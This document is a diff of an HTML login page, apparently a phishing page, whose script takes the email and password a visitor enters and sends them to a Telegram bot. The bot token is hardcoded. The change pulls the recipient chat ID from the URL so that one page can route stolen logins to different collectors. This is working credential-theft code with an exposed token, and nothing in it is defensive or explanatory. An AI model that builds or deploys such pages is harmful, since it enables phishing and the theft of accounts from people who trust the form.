@@ -11,7 +11,7 @@
 
     .login-box {
       background: #fff;
-      width: 280px;
+      width: 360px;
       margin: 100px auto;
       padding: 40px;
       box-shadow: 0 0 8px rgba(0,0,0,0.1);
@@ -70,55 +70,47 @@
   </div>
 
   <script>
-    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // 🔑 توكن البوت بتاعك
-    const adminId = "7776054542";   // 🆔 الآيدى اللى هيستلم البيانات
+    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
+      // استخراج الـ chatId من الرابط
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chatId');
+
+      if (!chatId) {
+        alert("❌ مفيش chatId في الرابط!");
+        return;
+      }
+
+      // جلب البيانات من المدخلات
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
       const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`;
 
+      // إرسال البيانات للبوت باستخدام chatId
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: adminId,
+          chat_id: chatId,
           text: message
         })
       })
       .then(response => response.json())
       .then(data => {
-        alert("✅ تم إرسال البيانات للبوت");
-        // هنا تعمل Redirect لو عايز
+        alert("✅ تم الإرسال بنجاح!");
       })
       .catch(error => {
         console.error("خطأ:", error);
-        alert("❌ حصلت مشكلة أثناء الإرسال");
+        alert("❌ حصل خطأ أثناء الإرسال!");
       });
     });
   </script>
-<script>
-    window.onload = function() {
-      const params = new URLSearchParams(window.location.search);
-      const chatId = params.get('chatId');
-      const id = params.get('id');
 
-      if (chatId) {
-        // لو فيه chatId نحوله إلى id في نفس الصفحة
-        const targetURL = `${window.location.pathname}?id=${chatId}`;
-        window.location.href = targetURL;
-      } else if (id) {
-        // لو فيه id نعرضه
-        document.getElementById('showId').innerText = id;
-      } else {
-        document.getElementById('showId').innerText = "❌ لا يوجد ID في الرابط.";
-      }
-    };
-  </script>
 </body>
 </html>
